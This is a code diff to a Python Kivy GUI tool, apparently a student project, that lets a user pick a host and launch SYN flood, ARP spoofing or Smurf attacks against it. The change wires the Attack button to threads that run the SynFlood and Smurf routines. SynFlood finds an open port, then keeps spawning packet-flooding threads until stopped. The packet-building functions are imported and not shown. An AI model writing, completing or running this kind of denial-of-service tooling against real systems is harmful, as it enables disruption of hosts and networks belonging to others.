@@ -1,4 +1,3 @@
-from asyncio.base_futures import _FINISHED
 from threading import Thread
 import threading
 from time import sleep
@@ -11,7 +10,6 @@ from kivy.core.window import Window
 from kivy.uix.floatlayout import FloatLayout
 from kivy.animation import Animation
 from kivy.uix.popup import Popup
-from zmq import NULL
 from modules.arp import ARPSpoofer, disable_ip_forwarding, enable_ip_forwarding
 
 
@@ -40,14 +38,16 @@ class FloatLayouts(FloatLayout):
 
 class P1(FloatLayout):
     ATTACK_STOP = False
+    ATTACK_RUN = False
     Dane = modules.auxilliary.dane()
-    c = NULL
+    c = None
+    d = None
     finished = True
     Dane.STOP = False
     def ClickedConf1(self):
         Clock.schedule_interval(self.Refresh, 1)
         if(P1.finished==True):
-            if(P1.c==NULL):
+            if(P1.c==None):
                 P1.finished = False
                 P1.c = Thread(target=self.SearchForHosts)
                 #P1.c.daemon = True
@@ -58,7 +58,7 @@ class P1(FloatLayout):
             self.Dane.STOP = True
             P1.c.join()
             self.ids.scan_button.text = "Scan"
-            P1.c = NULL
+            P1.c = None
             P1.finished = True
         
         
@@ -73,21 +73,35 @@ class P1(FloatLayout):
 
     
     def ClickedConf1_atk(self):
-        if(self.ATTACK_STOP == False):
-            #Run attack
-            self.ids.button_atk.text = "Stop"
-            if (self.ids.spinner_id_atk.text == "SYN flood"):
-                print("Syn")
-            elif (self.ids.spinner_id_atk.text == "ARP spoof"):
-                print("ARP")
-            elif (self.ids.spinner_id_atk.text == "Smurf"):
-                print("Smurf")
-            else:
-                print("Nieznany atak")
+        if(P1.ATTACK_RUN == False):
+            try:
+                #Run attack
+                P1.ATTACK_RUN = True
+                self.ids.button_atk.text = "Stop"
+                if (self.ids.spinner_id_atk.text == "SYN flood"):
+                    P1.d = Thread(target = self.SynFlood, args=(self.ids.spinner_id.text,))
+                    print(str(self.ids.spinner_id.text))
+                    P1.d.start()
+                elif (self.ids.spinner_id_atk.text == "ARP spoof"):
+                    #ARP do przerobienia, nast odkomentowac
+                    #P1.d = Thread(target=self.ARP, args=(self.ids.spinner_id.text,))
+                    #P1.d.start()
+                    print("ARP")
+                elif (self.ids.spinner_id_atk.text == "Smurf"):
+                    P1.d = Thread(target=self.Smurf, args=(self.ids.spinner_id.text,))
+                    P1.d.start()
+                else:
+                    print("Nieznany atak")
+            except Exception:
+                self.ids.button_atk.text = "Attack"
+                print("Atak zrobił salto : ")
         else:
             #Stop attack
             self.ids.button_atk.text = "Attack"
-            self.ATTACK_STOP = True
+            P1.ATTACK_STOP = True
+            P1.d.join()
+            P1.d = None
+            P1.ATTACK_RUN = False
 
 
 
@@ -102,7 +116,7 @@ class P1(FloatLayout):
             P1.c.join()
         except:
             print("kupa")
-        P1.c = NULL
+        P1.c = None
 
     def Refresh(self, interval):
         if(P1.finished == False):
@@ -112,13 +126,13 @@ class P1(FloatLayout):
         else:
             self.ids.scan_button.text = "Scan"
 
-    def SynFlood(self, IP):
+    def SynFlood(self, IP:str):
         self.ids.Satus_label.text = "[b]Attack status: Scanning[/b]"
         print("starting syn flood")
         port = self.Dane.scan_host_ports_multi_thread_get_first(IP)
         self.ids.Satus_label.text = "[b]Attack status: Attacking[/b]"
         threads = []
-        while(self.ATTACK_STOP != True):
+        while(P1.ATTACK_STOP != True):
             thread = threading.Thread(target = syn_flood_packet,args = [str(IP),port])
             sleep(0.2)
             thread.start()
@@ -127,7 +141,8 @@ class P1(FloatLayout):
         print("ending syn flood")
         for t in threads:
             t.join()
-        self.ATTACK_STOP = False
+        P1.ATTACK_STOP = False
+        self.ids.Satus_label.text = "[b]Attack status: IDLE[/b]"
         print("syn flood closed all threads")
     
     def ARP(self, IP):
@@ -141,16 +156,16 @@ class P1(FloatLayout):
         disable_ip_forwarding()
         #koniec fragmentu do edycji
 
-        self.ids.Satus_label.text = "[b]Attack status: Finished[/b]"
-        self.ATTACK_STOP = False
+        self.ids.Satus_label.text = "[b]Attack status: IDLE[/b]"
+        P1.ATTACK_STOP = False
     
     def Smurf(self, IP):
         print("starting Smurf")
         self.ids.Satus_label.text = "[b]Attack status: attacking[/b]"
         while(self.ATTACK_STOP != True):
             smurf_packet(IP)
-        self.ids.Satus_label.text = "[b]Attack status: Finished[/b]"
-        self.ATTACK_STOP = False
+        self.ids.Satus_label.text = "[b]Attack status: IDLE[/b]"
+        P1.ATTACK_STOP = False
 
       
         
